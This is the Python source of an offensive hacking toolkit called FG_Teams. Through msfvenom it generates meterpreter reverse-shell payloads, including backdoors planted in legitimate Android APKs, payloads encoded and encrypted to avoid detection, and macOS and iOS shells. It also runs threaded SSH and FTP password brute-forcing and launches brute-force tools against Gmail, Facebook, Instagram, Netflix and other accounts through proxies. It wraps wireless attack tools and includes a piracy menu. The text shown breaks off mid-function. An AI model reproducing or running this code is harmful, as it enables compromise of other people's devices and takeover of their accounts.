"""
MIT License

Copyright (c) 2023 Furjack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NON INFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
import csv
import ipaddress
import logging
import os
import queue
import random
import socket
import string
import subprocess
import sys
import threading
import time
import warnings
from ftplib import FTP
from logging import NullHandler
warnings.filterwarnings("ignore")
import requests
from colorama import Fore
from getmac import get_mac_address
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from scapy.all import get_if_list




# note there is too many things pending in this software it will be updated soon


script_version = '1.6.10'


# <---main-menu--->
menu = """
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [1] Android                    |       [7] IOS                           ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [2] bruteforce                 |       [8] phishing                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [3] steganography              |       [9] Piracy                        ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [4] Mac OS                     |       [10] general                      ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [5] wireless-attacks           |       [11] More                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [6] Ghostnet                   |       [0] Exit                          ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <-- next-menu -->

next_menu = """ 
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [12] Webapp                    |       [18] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [13] coming soon               |       [19] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [14] coming soon               |       [20] coming soon                  ||                                                                       
        ||                                         |                                         ||                                                                                        
        ||          [15] coming soon               |       [21] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [16] coming soon               |       [22] coming soon                  ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [17] coming soon               |       [00] Exit                         ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <----logo---->
banner = f"""
|̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ |
| ███████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░██████╗ |
| ██╔════╝██╔════╝░╚══██╔══╝██╔════╝██╔══██╗████╗░████║██╔════╝ |
| █████╗░░██║░░██╗░░░░██║░░░█████╗░░███████║██╔████╔██║╚█████╗░ |
| ██╔══╝░░██║░░╚██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░╚═══██╗ |
| ██║░░░░░╚██████╔╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██████╔╝ |
| ╚═╝░░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░ |
|_______________________________________________________________|
| im not responsible for any misuse of this software, Thanks ❤  |
|_______________________________________________________________|by furjack
note : Buy me a coffee https://paypal.me/furjack
version = {script_version}
"""

# <----starting with a clear empty screen----->
os.system('clear')


# <---Functions--->
def showIp():
    host_name = socket.gethostname()
    Ip_Adress = socket.gethostbyname(host_name)

    print("\n[+] IP: " + Ip_Adress)

    myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']

    print("\n[+] Public IP: " + myip)


def options():
    global ipf, portf, outputf, iteratef
    print('your ip is\n')
    showIp()
    ipf = input('\nEnter your ip for LHOST: ')
    portf = input('\nEnter your port for LPORT: ')
    outputf = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iteratef = input('\nHow much time to increase the iteration of encoder from non detection: ')


def option_xp():
    global loc, ip, port, output, iterate
    print('your ip is')
    showIp()
    loc = input('\nEnter the location of apk: ')
    ip = input('\nEnter your ip for LHOST: ')
    port = input('\nEnter your port for LPORT: ')
    output = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iterate = input('\nHow much time to increase the iteration of encoder from non detection: ')


def encryption():
    global enc
    os.system('clear')
    print(Fore.BLUE, banner)
    print("Please select encryption:\n")

    encryption_list = ["aes256", "base64", "rc4", "xor"]

    for i, enc_type in enumerate(encryption_list, start=1):
        print(f"{i}. {enc_type}")

    lock = input("\nEnter the encryption (default=3): ").strip()

    try:
        enc = encryption_list[int(lock) - 1] if lock else "rc4"
    except (ValueError, IndexError):
        print("Invalid argument. Exiting!")
        sys.exit(0)

def encoders():
    global e

    os.system('clear')
    print(Fore.BLUE, banner)
    print("Please select an encoder:\n")

    encoder_list = [
        "cmd/brace", "cmd/echo", "cmd/generic_sh", "cmd/ifs", "cmd/perl",
        "cmd/powershell_base64", "cmd/printf_php_mq", "generic/eicar", "generic/none",
        "mipsbe/byte_xori", "mipsbe/longxor", "mipsle/byte_xori", "mipsle/longxor",
        "php/base64", "ppc/longxor", "ppc/longxor_tag", "ruby/base64", "sparc/longxor_tag",
        "x64/xor", "x64/xor_context", "x64/xor_dynamic", "x64/zutto_dekiru",
        "x86/add_sub", "x86/alpha_mixed", "x86/alpha_upper", "x86/avoid_underscore_tolower",
        "x86/avoid_utf8_tolower", "x86/bloxor", "x86/bmp_polyglot", "x86/call4_dword_xor",
        "x86/context_cpuid", "x86/context_stat", "x86/context_time", "x86/countdown",
        "x86/fnstenv_mov", "x86/jmp_call_additive", "x86/nonalpha", "x86/nonupper",
        "x86/opt_sub", "x86/service", "x86/shikata_ga_nai", "x86/single_static_bit",
        "x86/unicode_mixed", "x86/unicode_upper", "x86/xor_dynamic"
    ]

    # Display encoders dynamically
    for i, enc in enumerate(encoder_list, start=1):
        print(f"{i}. {enc}")

    # Get user input
    encoder = input("\nSelect encoder (default=41): ").strip()

    try:
        e = encoder_list[int(encoder) - 1] if encoder else "x86/shikata_ga_nai"
    except (ValueError, IndexError):
        print("Invalid argument. Exiting!")
        sys.exit()


def payloads():
    global pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print("Select what type of payload you want:\n")

    payload_list = [
        "android/meterpreter_reverse_https",
        "android/meterpreter/reverse_https",
        "android/meterpreter_reverse_http",
        "android/meterpreter/reverse_http",
        "android/meterpreter_reverse_tcp",
        "android/meterpreter/reverse_tcp",
        "android/shell/reverse_https",
        "android/shell/reverse_http",
        "android/shell/reverse_tcp"
    ]

    for i, payload in enumerate(payload_list, start=1):
        print(f"{i}. {payload}")

    choice = input("\nEnter (default=6): ").strip()

    try:
        pa = payload_list[int(choice) - 1] if choice else "android/meterpreter/reverse_tcp"
    except (ValueError, IndexError):
        print("Invalid argument. Exiting!")
        sys.exit()


def payloads_x_e():
    global p
    os.system('clear')
    print(Fore.BLUE, banner)
    print("Select what type of payload you want:\n")

    payload_list = [
        "android/meterpreter/reverse_https",
        "android/meterpreter/reverse_http",
        "android/meterpreter/reverse_tcp",
        "android/shell/reverse_https",
        "android/shell/reverse_http",
        "android/shell/reverse_tcp"
    ]

    for i, payload in enumerate(payload_list, start=1):
        print(f"{i}. {payload}")

    choice = input("\nEnter (default=3): ").strip()

    try:
        p = payload_list[int(choice) - 1] if choice else "android/meterpreter/reverse_tcp"
    except (ValueError, IndexError):
        print("Invalid argument. Exiting!")
        sys.exit()


def msfvenom_x():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch aarch64 --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' -i ' + str(iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_p():
    os.system('clear')
    print(Fore.BLUE, banner)
    options()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom --arch aarch64 --platform android -p ' + str(pa) + ' LHOST=' + str(ipf) + ' LPORT=' + str(
        portf) + ' --encoder ' + str(e) + ' -i ' + str(iteratef) + ' -o ' + str(os.getcwd()) + '/payload-apps/' + str(
        outputf))

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_encrypt():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    encryption()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch aarch64 --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' --encrypt ' + str(enc) + ' -i ' + str(
        iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


# <----functions of main menu---->
def Android():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload (main activity.apk)')
    print('\n3. encrypted backdoor payload')

    ist = input('\n\n\nEnter (default=0): ')

    if ist == "0":
        sys.exit()

    elif ist == "1":
        msfvenom_x()
        print('your payload is successfully created and stored in ../payload-apps/')

    elif ist == "2":
        msfvenom_p()
        print('your payload is successfully created and stored in ../payload-apps/')

    elif ist == "3":
        msfvenom_encrypt()
        print('your payload is successfully created and stored in ../payload-apps/')

    else:
        print('invalid argument exiting')
        sys.exit()


def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
        with open("credentials_found.txt", "a") as fh:
            # We write the credentials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")


# This function gets a valid IP address from the user.
def get_ip_address():
    # We create a while loop, that we'll break out of only once we've received a valid IP Address.
    while True:
        host = input("Please enter the host ip address: ")
        try:
            # Check if host is a valid IPv4 address. If so we return host.
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
            print("Please enter a valid ip address.")


# The program will start in the main function.
def __main__():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # To keep to functional programming standards we declare ssh_port inside a function.
    list_file = "passwords.csv"
    host = get_ip_address()
    # This function reads a csv file with passwords.
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        # We use the enumerate() on the csv_reader object. This allows us to access the index and the data.
        for index, row in enumerate(csv_reader):
            # The 0 index is where the headings are allocated.
            if index == 0:
                continue
            else:
                #  We create a thread on the ssh_connect function, and send the correct arguments to it.
                t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],))
                # We start the thread.
                t.start()
                # We leave a small time between starting a new connection thread.
                time.sleep(0.2)
                # ssh_connect(host, ssh_port, row[0], row[1])


def ssh_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    __main__()


# function for ftp brute force
def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(',')[0]
        passWord = line.split(',')[1].strip('\r').strip('\n')
        print("[+] Trying: " + str(userName) + "/" + str(passWord))
        try:
            ftp = FTP(hostname)
            ftp.login(userName, passWord)
            print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass

def ftp_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    hostName = str(input('Enter the host: '))
    passwordFile = 'passwords.csv'
    bruteForceLogin(hostName, passwordFile)

    t = threading.Thread(target=bruteForceLogin, args=(hostName, passwordFile))
    t.start()
    time.sleep(0.2)


def gmail_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    mail = input('\n\nEnter the mail adress: ')
    plist = input('\nEnter the password-list path(/path/to/file): ')
    proxy_list = input('\nEnter the proxy-list path(/path/to/file):')

    os.system(f'lib/./brute-force -g {mail} -l {plist} -X {proxy_list}')


def hotmail_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    mail = input('\n\nEnter the mail adress: ')
    plist = input('\nEnter the password-list path(/path/to/file): ')
    proxy_list = input('\nEnter the proxy-list path(/path/to/file):')

    os.system(f'lib/./brute-force -t {mail} -l {plist} -X {proxy_list}')


def facebook_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    mail = input('\n\nEnter the mail adress or username: ')
    plist = input('\nEnter the password-list path(/path/to/file): ')
    proxy_list = input('\nEnter the proxy-list path(/path/to/file):')

    os.system(f'lib/./brute-force -f {mail} -l {plist} -X {proxy_list}')

def twitter_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    mail = input('\n\nEnter the mail adress or username: ')
    plist = input('\nEnter the password-list path(/path/to/file): ')
    proxy_list = input('\nEnter the proxy-list path(/path/to/file):')

    os.system(f'lib/./brute-force -T {mail} -l {plist} -X {proxy_list}')



def netflix_bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    mail = input('\n\nEnter the mail adress or username: ')
    plist = input('\nEnter the password-list path(/path/to/file): ')
    proxy_list = input('\nEnter the proxy-list path(/path/to/file):')

    os.system(f'lib/./brute-force -n {mail} -l {plist} -X {proxy_list}')


def instagram_bruteforce():
    ins_user = input('Enter the target username: ')
    ins_passlist = input('Enter the passlist directory: ')
    ins_proxy = input('Enter the proxylist file path: ')
    ins_mode = input('Enter modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots: ')
    os.system('clear')
    os.system(f'./insta -u {ins_user} -p {ins_passlist} -px {ins_proxy} -m {ins_mode}')

def bruteforce():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\nselect an option')
    print('\n\n1. SSH')
    print('\n2. FTP')
    print('\n3. Gmail')
    print('\n4. Hotmail')
    print('\n5, Facebook')
    print('\n6. Twitter')
    print('\n7. Netflix')
    print('\n8. Instagram')
    brute = input('\n\n\nFG_Teams: ')

    if brute == '1':
        ssh_bruteforce()
    elif brute == '2':
        ftp_bruteforce()
    elif brute == '3':
        gmail_bruteforce()
    elif brute == '4':
        hotmail_bruteforce()
    elif brute == '5':
        facebook_bruteforce()
    elif brute == '6':
        twitter_bruteforce()
    elif brute == '7':
        netflix_bruteforce()
    elif brute == '8':
        instagram_bruteforce()
    else:
        print('invalid argument exiting')
        sys.exit()

def Steganography_extract():
    os.system('clear')
    print(Fore.BLUE, banner)
    extract = input('\nEnter the path to stegofile: ')
    os.system('steghide extract -sf ' + str(extract) + ' -v')


def Steganography_Info():
    os.system('clear')
    print(Fore.BLUE, banner)
    stego = input('\nEnter the path to stegofile: ')
    os.system('steghide --info ' + str(stego))


def Steganography_hide():
    os.system('clear')
    print(Fore.BLUE, banner)
    img = input('\n\nEnter the path of cover file: ')
    secret = input('\nEnter the path of .txt(secret file) file: ')
    compress = input('\nwould u like to compress the file (y/n): ').lower()
    passw = input('\nCreate password: ')

    if compress == 'y':
        compress_level = input('\nEnter compression between 1-9: ')
        compression = '-z ' + str(compress_level)
    elif compress == '':
        compress_level = input('\nEnter compression between 1-9: ')
        compression = '-z ' + str(compress_level)
    else:
        compression = '-Z'
    print('\nYour stegofile is being created be patient')
    os.system('steghide embed -cf ' + str(img) + ' -ef ' + str(secret) + ' -p ' + str(
        passw) + ' -sf stegimg.jpg ' + str(compression))


def Steganography():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n1. hide data in a file')
    print('\n2.Extract data of a stegofile')
    print('\n3.Info of a stegofile')
    stego_option = input('\n\n\nFG_Teams: ')

    if stego_option == '1':
        Steganography_hide()
    elif stego_option == '2':
        Steganography_extract()
    elif stego_option == '3':
        Steganography_Info()
    else:
        print('invalid argument exiting')
        sys.exit()

def StegMenu():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n1. matroschka')
    print('\n2. openpuff')
    print('\n3. pngcheck')
    print('\n4. silenteye')
    print('\n5. stegcracker')
    print('\n6. stegdetect')
    print('\n7. steghide')
    print('\n8. stegolego')
    print('\n9. stegoveritas')
    print('\n10. stegseek')
    print('\n11. stegsolve')
    print('\n12. stepic')
    print('\n13. zsteg')

    steg = input('Enter your choice: ')
    if steg == '7':
        Steganography()


def armor():
    os.system('clear')
    rc = subprocess.call(['which', 'armor'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc != 0:
        print('[*] Installing the tool needed for mac payload generator')
        subprocess.call(['yes | pacman -S armor'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
        print('[*] Installed the armor tool By tokyoneon')
    print('[*] creating payload.txt')
    print('Note if it asks anything to install make sure to install and run FG_Teams again')
    os.system('echo -e "openssl aes-256-cbc -a -salt -in test.txt -out test.txt -k password"> payload.txt')
    mac_ip = input('enter ur ip: ')
    mac_port = input('enter port: ')
    print('creating payload using the armor')
    os.system('armor payload.txt ' + str(mac_ip) + ' ' + str(mac_port))


def mac_payloads():
    global osx_pa

    os.system('clear')
    print(Fore.BLUE, banner)
    print("Select what type of payload you want:\n")

    payloads = [
        "osx/ppc/shell/bind_tcp",
        "osx/ppc/shell/find_tag",
        "osx/ppc/shell/reverse_tcp",
        "osx/ppc/shell_bind_tcp",
        "osx/ppc/shell_reverse_tcp",
        "osx/x64/dupandexecve/bind_tcp",
        "osx/x64/dupandexecve/reverse_tcp",
        "osx/x64/dupandexecve/reverse_tcp_uuid",
        "osx/x64/exec",
        "osx/x64/meterpreter/bind_tcp",
        "osx/x64/meterpreter/reverse_tcp",
        "osx/x64/meterpreter/reverse_tcp_uuid",
        "osx/x64/meterpreter_reverse_http",
        "osx/x64/meterpreter_reverse_https",
        "osx/x64/meterpreter_reverse_tcp",
        "osx/x64/say",
        "osx/x64/shell_bind_tcp",
        "osx/x64/shell_find_tag",
        "osx/x64/shell_reverse_tcp",
        "osx/x86/bundleinject/bind_tcp",
        "osx/x86/bundleinject/reverse_tcp",
        "osx/x86/exec",
        "osx/x86/isight/bind_tcp",
        "osx/x86/isight/reverse_tcp",
        "osx/x86/shell_bind_tcp",
        "osx/x86/shell_find_port",
        "osx/x86/shell_reverse_tcp",
        "osx/x86/vforkshell/bind_tcp",
        "osx/x86/vforkshell/reverse_tcp",
        "osx/x86/vforkshell_bind_tcp",
        "osx/x86/vforkshell_reverse_tcp"
    ]

    # Display options dynamically
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}. {payload}")

    # Get user input
    osx_payload = input("\nEnter choice (default=6): ").strip()

    try:
        osx_pa = payloads[int(osx_payload) - 1] if osx_payload else "osx/x64/meterpreter/reverse_tcp"
    except (ValueError, IndexError):
        print("Invalid argument. Exiting!")
        sys.exit()


def mac_payload():
    os.system('clear')
    osx_ip = input('\nEnter ur Ip: ')
    osx_port = input('\nEnter Port: ')
    osx_output = input('Enter the output file name: ')
    mac_payloads()
    os.system('msfvenom -p ' + str(osx_pa) + ' LHOST=' + str(osx_ip) + ' LPORT=' + str(osx_port) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(osx_output) + ' -f macho --platform osx')



def choose():
    os.system('clear')
    print('\nChoose the option')
    print('\n1. armor [netcat listener by tokyoneon]')
    print('\n2. mac os payload with all payloads available in metasploit')
    ch = input('\n\n\nFG_Teams: ')
    if ch == '1':
        armor()
    elif ch == '2':
        mac_payload()
    elif ch == '':
        mac_payload()
    else:
        print('invalid argument exiting')
        sys.exit()


def Mac():
    os.system('clear')
    print(Fore.BLUE, banner)
    choose()

def Airgeddon():
    rc = subprocess.call(['which', 'airgeddon'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc != 0:
        print('airgeddon is not installed \ninstalling')
        subprocess.call(['yes | pacman -S airgeddon'], shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    os.system('airgeddon')


def wireless():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n1. Airgeddon')
    print('\n2. Airflood')
    print('\n3. Airopy')
    print('\n4. Airoscript')
    print('\n5. Airpwn')
    print('\n6. Aphopper')
    print('\n7. Apnbf')
    print('\n8. Atear')
    print('\n9. Auto-eap')
    print('\n10. Batman-adv')
    print('\n11. Batman-alfred')
    print('\n12. Beholder')
    print('\n13. Boopsuite')
    print('\n14. Create_ap')
    print('\n15. Eapeak')
    print('\n16. Eaphammer')
    print('\n17. Fern-wifi-cracker')
    print('\n18. Free_wifi')
    print('\n19. Fuzzap')
    print('\n20. G72x++')
    print('\n21. Gerix-wifi-cracker')
    print('\n22. giskismet')
    print('\n23. hashcatch')
    print('\n24. hoover')
    print('\n25. hostapd-wpe')
    print('\n26. hotspotter')
    print('\n27. Jcrack')
    print('\n28. Kismet-earth')
    print('\n29. kismet2earth')
    print('\n30. Kismon')
    print('\n31. Mana')
    print('\n32. mdk3')
    print('\n33. mfcuk')
    print('\n34. mitmap')
    print('\n35. mousejack')
    print('\36. mtscan')
    print('\n37. netattack')
    print('\n38. nzyme')
    print('\n39. pidense')
    print('\n40. python-trackerjacker')
    print('\n41. rfidiot')
    print('\n42. rfidtool')
    print('\n43. roguehostapd')
    print('\n44. rtl8814au-dkms-git')
    print('\n45. sniff-probe-req')
    print('\n46. spectools')
    print('\n47. timegen')
    print('\n48. ubitack')
    print('\n49. waidps')
    print('\n50. wepbuster')
    print('\n51. wi-feye')
    print('\n52. wifi-pumpkin')
    print('\n53. wifibroot')
    print('\n54. wificurse')
    print('\n55. wifijammer')
    print('\n56. wifiphisher')
    print('\n57. wifiscanmap')
    print('\n58. wifitap')
    print('\n59. wireless-ids')
    print('\n60. wirouter-keyrec')
    print('\n61. wlan2eth')
    print('\n62. wpa-bruteforcer')
    print('\n63. wpa2-halfhandshake-crack')
    print('\n64. wpsik')
    print('\n65. zizzania')
    print('\n66. zykeys')


    wire = input('FG_Teams: ')
    if wire == '1':
        Airgeddon()
    elif wire == '':
        print('invalid option using default')
        Airgeddon()
    else:
        print('invalid argument exiting')
        sys.exit()


def Ghostnet():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\nA special thanks for mach1el to create this tool ghostnet')
    print('\nGhostnet is tool to anonymize your ip and mac address it changes randomly every minutes')
    print('\n1. Start')
    print('\n2. Stop')
    print('\n3. Status')

    g = input('\n\nghostnet: ')

    if g == '1':
        os.system('ghostnet start')
    elif g == '2':
        os.system('ghostnet stop')
    elif g == '3':
        os.system('ghostnet status')
    elif g == '':
        os.system('ghostnet')
    else:
        print('invalid argument exiting')
        sys.exit()


def More():
    os.system('clear')
    print(Fore.BLUE, banner)
    print(next_menu)


def coming_soon():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\ncoming soon under development Thanks for using this tool')
    sys.exit()


def ios_payloads():
    global ios_pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. osx/armle/shell_reverse_tcp.rb')
    print('\n2. osx/armle/execute/bind_tcp')
    print('\n3. osx/armle/execute/reverse_tcp')
    print('\n4. osx/armle/shell/bind_tcp')
    print('\n5. osx/armle/shell/reverse_tcp')
    print('\n6. osx/armle/shell_bind_tcp')
    print('\n7. osx/armle/shell_reverse_tcp')
    print('\n8. osx/armle/vibrate')

    ipayload = input('\n\n\nEnter (default=6):')
    if ipayload == '1':
        ios_pa = 'osx/armle/shell_reverse_tcp.rb'
    elif ipayload == '2':
        ios_pa = 'osx/armle/execute/bind_tcp'
    elif ipayload == '3':
        ios_pa = 'osx/armle/execute/reverse_tcp'
    elif ipayload == '4':
        ios_pa = 'osx/armle/shell/bind_tcp'
    elif ipayload == '5':
        ios_pa = 'osx/armle/shell/reverse_tcp'
    elif ipayload == '6':
        ios_pa = 'osx/armle/shell_bind_tcp'
    elif ipayload == '7':
        ios_pa = 'osx/armle/shell_reverse_tcp'
    elif ipayload == '8':
        ios_pa = 'osx/armle/vibrate'
    elif ipayload == '':
        ios_pa = 'osx/armle/shell_reverse_tcp.rb'
    else:
        print('invalid argument exiting')
        sys.exit()


def IOS():
    os.system('clear')
    print(Fore.BLUE, banner)
    ios_ip = input('\nEnter ur Ip: ')
    ios_port = input('\nEnter Port: ')
    ios_output = input('Enter the output file name: ')
    ios_payloads()
    os.system('msfvenom -p '+ str(ios_pa) +' LHOST='+ str(ios_ip) +' LPORT='+str(ios_port)+' -o ' + str(os.getcwd()) + '/payload-apps/'+ str(ios_output) +' -f macho -a armle --platform osx')
    print('after this convert ur output file to deb and run it on apple phones')


def Piracy():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n\n1. movie download')
    print('\n2. game download')
    print('\n3. repacked game download')
    print('\n4. books download')

    pc = input('FG_Teams: ')

    if pc == '1':
        os.system('fg_movies')
    elif pc == '2':
        coming_soon()
    elif pc == '3':
        coming_soon()
    elif pc == '':
        os.system('fg_movies')
    else:
        print('invalid argument exiting')
        sys.exit()

def WebApp():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n\n\n1. 0d1n')
    print('\n2. abuse-ssl-bypass-waf')
    print('\n3. adfind')
    print('\n4. adminpagefinder')
    print('\n5. albatar')
    print('\n6. anti-xss')
    print('\n7. arachni')
    print('\n8. astra')
    print('\n9. atlas')


def dis_monitor():
    os.system('clear')
    print(Fore.BLUE, banner)
    interfaces = get_if_list()

    print("Select interface:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")

    selected = int(input("FG_Teams: "))
    selected_interface = interfaces[selected - 1]
    subprocess.run(["ip", "link", "set", selected_interface, "down"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", selected_interface, "mode", "managed"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl","start","NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{selected_interface} is now back to normal")


def en_monitor():
    os.system('clear')
    print(Fore.BLUE, banner)
    interfaces = get_if_list()

    print("Select interface:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")

    selected = int(input("FG_Teams: "))
    selected_interface = interfaces[selected - 1]

    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iwconfig", selected_interface, "mode", "monitor"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    subprocess.run(["ip","link","set",selected_interface,"up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{selected_interface} is now in monitor mode.")

def showIp_and_public():
    os.system('clear')
    print(Fore.BLUE, banner)
    ip = socket.gethostbyname(socket.gethostname())
    print("Your IP address is:", ip)

    response = requests.get("https://api.ipify.org")
    public_ip = response.text
    print("Your public IP address is:", public_ip)


def show_mac_addr():
    os.system('clear')
    print(Fore.BLUE, banner)
    mac = get_mac_address()
    print("Your MAC address is:", mac)


def wordlist():
    os.system('clear')
    print(Fore.BLUE, banner)
    characters = string.ascii_letters + string.digits + string.punctuation
    password_queue = queue.Queue()

    def generate_passwords():
        while True:
            password = ''.join(random.choices(characters, k=int(password_length)))
            password_queue.put(password)

    password_length = input("Enter the desired password length: ")

    total_possible_passwords = len(characters) ** int(password_length)

